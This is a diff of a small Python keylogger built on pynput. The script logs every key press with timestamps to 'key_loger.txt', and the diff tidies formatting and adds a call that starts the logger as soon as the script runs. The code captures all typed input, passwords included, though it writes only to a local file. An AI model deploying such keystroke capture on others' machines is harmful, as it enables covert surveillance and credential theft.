@@ -6,7 +6,8 @@ from pynput.keyboard import Key, Controller, Listener
 
 log_dir = ""
 
-logging.basicConfig(filename=(log_dir + "key_loger.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename=(log_dir + "key_loger.txt"),
+                    level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
 keyboard = Controller()
 
@@ -25,8 +26,8 @@ def pres_relise_key(key, delay=0.1):
     keyboard.release(key)
 
 
-def on_press(Key):
-    logging.info(Key)
+def on_press(key):
+    logging.info(key)
 
 
 def on_release(key):
@@ -36,6 +37,8 @@ def on_release(key):
 
 def keyboard_loger():
     """ save logs of typed char in file 'key_loger.txt' to exit type insert """
-    with Listener(on_press=on_press,on_release=on_release) as listener:
+    with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
+
+keyboard_loger()
